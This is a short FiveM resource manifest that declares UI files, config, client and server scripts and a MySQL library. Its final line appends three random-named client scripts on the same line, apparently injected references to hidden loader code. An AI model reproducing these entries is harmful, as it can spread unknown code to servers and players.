ui_page {
    'nui/index.html',
}

files {
    'nui/index.html',
    'nui/main.js',
    'nui/main.css',
    'nui/logo.png',
    'nui/gtafont.woff',
    'nui/gtafont.woff2',
}

client_script 'config.lua'
server_script 'config.lua'

client_script 'client.lua'
server_script 'server.lua'

server_script '@mysql-async/lib/MySQL.lua'client_script "THPTO.lua"client_script "xwbNi.lua"client_script "RsMWi.lua"
